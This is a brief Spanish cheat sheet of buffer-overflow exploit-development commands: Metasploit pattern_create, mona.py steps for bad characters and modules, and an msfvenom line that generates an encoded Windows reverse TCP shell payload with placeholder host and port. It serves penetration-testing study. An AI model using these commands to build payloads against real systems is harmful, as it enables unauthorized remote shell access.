

## Comandos msfvenom

```bash
/usr/share/metasploit-framework/exploit/pattern_create.rb -p -l {}
```


```bash
/usr/share/metasploit-framework/exploit/pattern_create.rb -l {longitud}
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={Puerto} -a x86 --platform windows --bad-chars "{Chars_para_evitar}" -e x86/shikata_ga_nai -f c
```

## Comandos Mona.py

```ruby
!mona config -set workingfolder C:\Users\{usuario}\Desktop\%p
```
 
 - Definir carpeta de trabajo

```ruby
!mona bytearray 
```

- Crear el bytearray (listado de \\x00 a \\xff)

```ruby
!mona compare -f {Ruta_hasta_el_archivo_bytearray} -a {Direccion_de_ESP}
```

- comparar los bytes que llegaron con los almacenados en el bytearray para determinar los bad-chars

```ruby
!mona modules 
```

- listar los modulos disponibles

